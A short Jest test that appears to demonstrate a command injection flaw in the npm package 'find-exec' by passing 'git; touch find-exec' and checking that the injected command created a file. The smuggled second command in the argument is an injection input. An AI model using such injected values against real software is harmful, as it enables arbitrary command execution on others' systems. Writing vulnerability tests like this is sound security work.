test("Remote code execution in find-exec", (done) => {
  const fs = require('fs');
  const find = require('find-exec');

  const maliciousFile = './find-exec';
  if (fs.existsSync(maliciousFile))
    fs.unlinkSync(maliciousFile);

  file_exist = fs.existsSync(maliciousFile);
  expect(file_exist).toBe(false);

  find('git; touch find-exec');

  file_exist = fs.existsSync(maliciousFile);
  expect(file_exist).toBe(true);
  fs.unlink(maliciousFile, (err) => { done(); });
})
